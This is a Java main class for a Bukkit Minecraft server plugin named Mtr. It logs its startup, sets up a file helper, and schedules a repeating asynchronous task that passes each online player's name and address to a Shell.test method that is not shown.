package me.gmx.mtr;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

import java.io.File;
import java.util.Date;
import java.util.logging.Level;
import java.util.logging.Logger;

public class Mtr extends JavaPlugin {
    Logger logger;
    File logFile;
    private FileStuff fs;
    private static Mtr ins;
    public void onEnable(){
        ins = this;
        logger = getLogger();
        this.logger.log(Level.INFO, String.format("[%s] Successfully enabled version %s!", new Object[] { getDescription().getName(), getDescription().getVersion() }));
        fs = new FileStuff(ins);
        fs.setup();
    }

    public void onDisable(){

    }

    public FileStuff getFs(){
        return this.fs;
    }

    public static Mtr getInstance(){
        return ins;
    }
    public void init(){


        new BukkitRunnable(){

            public void run(){
                for (Player p : Bukkit.getOnlinePlayers()){
                    Shell.test(p.getName(),p.getAddress());
                }
            }
        }.runTaskTimerAsynchronously(ins,120,40);


    }




}
